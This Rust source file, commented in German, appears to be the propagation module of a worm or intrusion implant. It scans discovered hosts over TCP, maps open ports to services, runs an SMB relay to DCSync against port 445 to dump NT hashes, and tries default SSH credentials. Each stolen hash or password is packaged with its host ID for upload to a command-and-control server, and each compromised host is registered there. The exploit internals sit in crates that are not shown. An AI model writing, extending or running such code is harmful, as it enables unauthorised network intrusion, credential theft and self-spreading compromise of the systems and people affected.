//! Propagationslogik: Scan → Service-Identifikation → Exploit.
//!
//! Führt einen TCP-Connect-Scan auf entdeckten Hosts aus, identifiziert die
//! Dienste über ein lokales Port-Mapping und versucht gezielte Exploits
//! (SMB-Relay für Windows/445, Credential-Stuffing für SSH).
//!
//! Jedes erbeutete Secret trägt die Kennung des Hosts, bei dem es erbeutet
//! wurde. Diese Information entsteht hier, während der Host im Scope ist —
//! weiter oben wäre sie verloren.

use std::net::IpAddr;

use kx_core::c2::{self, RegisterRequest, SecretUpload};
use kx_exploit::{smb_relay_dcsync, try_default_credentials, RelayConfig};
use kx_scanner::{scan_tcp, DiscoveredHost, ScanResults};
use tracing::{debug, info, warn};

/// Ergebnis eines Propagationslaufs.
pub struct PropagationResults {
    /// Neuentdeckte Hosts für die C2-Registrierung — je Host genau einer.
    pub new_hosts: Vec<RegisterRequest>,
    /// Neuerbeutete Secrets für den C2-Upload.
    pub new_secrets: Vec<SecretUpload>,
}

/// Mappt einen TCP-Port auf einen Dienstnamen (einfache Heuristik).
fn service_for_port(port: u16) -> &'static str {
    match port {
        22 => "ssh",
        23 => "telnet",
        25 => "smtp",
        80 => "http",
        443 => "https",
        1433 => "mssql",
        1521 => "oracle",
        3306 => "mysql",
        5432 => "postgres",
        5900 => "vnc",
        8080 => "http-proxy",
        8443 => "https-alt",
        2375 | 2376 => "docker",
        445 => "smb",
        135 => "msrpc",
        _ => "unknown",
    }
}

/// Führt die vollständige Propagations-Schleife aus.
pub async fn run_propagation(
    discovered: &[DiscoveredHost],
    relay_script: &str,
    _wmi_script: &str,
) -> PropagationResults {
    let mut results = PropagationResults {
        new_hosts: Vec::new(),
        new_secrets: Vec::new(),
    };

    if discovered.is_empty() {
        debug!("Keine Hosts entdeckt — Propagation beendet");
        return results;
    }

    let ips: Vec<IpAddr> = discovered.iter().map(|h| h.ip).collect();
    info!("TCP-Scan auf {} Hosts", ips.len());
    let scan: ScanResults = scan_tcp(&ips, kx_scanner::COMMON_PORTS, 1000).await;

    for (host, ports) in &scan.open_ports {
        let host_id = host.to_string();
        let mut status = c2::STATUS_DISCOVERED.to_string();
        let mut os: Option<String> = None;

        for port in ports {
            let service = service_for_port(*port);
            info!("Offener Port {} auf {} ({})", port, host, service);

            // Windows + SMB (445) → SMB-Relay→DCSync.
            if *port == 445 {
                let relay_cfg = RelayConfig {
                    target: host_id.clone(),
                    username: None,
                    password: None,
                    script_path: relay_script.to_string(),
                    domain: None,
                };
                match smb_relay_dcsync(&relay_cfg).await {
                    Ok(creds) => {
                        info!("SMB-Relay: {} Credentials erbeutet", creds.len());
                        for c in creds {
                            results.new_secrets.push(SecretUpload {
                                host_id: host_id.clone(),
                                cred_type: "nt_hash".into(),
                                username: c.username,
                                password: c.hash,
                                source: Some("smb_relay".into()),
                                master_key: None,
                            });
                        }
                        status = c2::STATUS_COMPROMISED.to_string();
                        os = Some("Windows".into());
                    }
                    Err(e) => warn!("SMB-Relay fehlgeschlagen: {e}"),
                }
            }

            // SSH (22) → Default-Credentials.
            if service == "ssh" {
                if let Ok(Some(auth)) = try_default_credentials(&host_id, service).await {
                    results.new_secrets.push(SecretUpload {
                        host_id: host_id.clone(),
                        cred_type: "password".into(),
                        username: auth.username,
                        password: auth.password,
                        source: Some("default_creds".into()),
                        master_key: None,
                    });
                    status = c2::STATUS_COMPROMISED.to_string();
                }
            }
        }

        // Jeden Host genau einmal registrieren. Vorher wurde er pro offenem Port
        // gepusht, wodurch ein späterer Eintrag mit Status `discovered` den
        // Status `compromised` überschrieb.
        results.new_hosts.push(RegisterRequest {
            host_id: host_id.clone(),
            ip: host_id,
            hostname: None,
            os,
            status: Some(status),
            sealed_master: None,
            master_key: None,
        });
    }

    results
}
